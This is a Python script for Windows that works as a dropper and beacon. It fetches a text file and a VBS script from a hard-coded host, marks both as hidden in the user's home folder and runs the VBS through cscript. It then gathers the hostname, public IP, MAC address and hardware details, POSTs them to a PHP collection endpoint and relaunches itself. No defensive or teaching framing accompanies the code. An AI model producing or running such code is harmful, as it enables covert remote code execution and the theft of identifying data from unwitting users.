import requests
import socket
import platform,socket,re,uuid,json,psutil,logging
import wmi
import subprocess
import sys
import os
import requests
import shutil
import ctypes
import urllib.request
#----------------------------------------------------

# URLs for the text file and VBS file (replace with the actual URLs)
text_file_url = "http://192.168.100.4:8080/Script.txt"
vbs_file_url = "http://192.168.100.4:8080/VBSEX.vbs"

# Get the user's home directory
user_home = os.path.expanduser("~")

# Path to the user's AppData\Roaming folder
roaming_folder = os.path.join(user_home)

# Create the AppData\Roaming folder if it doesn't exist
if not os.path.exists(roaming_folder):
    os.makedirs(roaming_folder)

# Function to download a file using requests
def download_file(url, local_path):
    try:
        response = requests.get(url)
        response.raise_for_status()
        with open(local_path, 'wb') as file:
            file.write(response.content)
        return True
    except Exception as e:
        print(f"Failed to download {url}: {str(e)}")
        return False

# Download the text file
text_file_path = os.path.join(roaming_folder, "textfile.txt")
if download_file(text_file_url, text_file_path):
    print(f"Downloaded {text_file_url} to {text_file_path}")
    # Set the file as hidden (Windows only)
    if os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetFileAttributesW(text_file_path, 2)  # 2 corresponds to hidden attribute
        except Exception as e:
            print(f"Failed to set {text_file_path} as hidden: {str(e)}")

# Download the VBS file
vbs_file_path = os.path.join(roaming_folder, "script.vbs")
if download_file(vbs_file_url, vbs_file_path):
    print(f"Downloaded {vbs_file_url} to {vbs_file_path}")
    # Set the file as hidden (Windows only)
    if os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetFileAttributesW(vbs_file_path, 2)  # 2 corresponds to hidden attribute
        except Exception as e:
            print(f"Failed to set {vbs_file_path} as hidden: {str(e)}")

# Run the VBS file
if os.path.isfile(vbs_file_path):
    os.system(f'cscript.exe "{vbs_file_path}"')

#----------------------------------------------------
computer = wmi.WMI()
computer_info = computer.Win32_ComputerSystem()[0]
os_info = computer.Win32_OperatingSystem()[0]
proc_info = computer.Win32_Processor()[0]
gpu_info = computer.Win32_VideoController()[0]

os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_version = ' '.join([os_info.Version, os_info.BuildNumber])
system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB

cpu = format(proc_info.Name)
gpu = format(gpu_info.Name)
System = platform.system()
res = platform.release()
mach = platform.machine()
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
pros = platform.processor()
ram = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
ip = requests.get('https://checkip.amazonaws.com').text.strip()

hostname = socket.gethostname()
data_to_send = {
    "DeviceID" : f"{hostname}",
    "IP Address" :f"{ip}",
    "System" : f"{System} {res}",
    "Mac" : f"{mac}",
    "Processor" : f"{cpu}",
    "GPU" : f"{gpu}",
    "Ram" : f"{ram}",
    "Machine" : f"{mach}",
}

php_url = "http://127.0.0.1:80/Save.php" 

response = requests.post(php_url, data=data_to_send)

print(response.text)

python_executable = sys.executable
subprocess.Popen([python_executable, os.path.abspath(__file__)])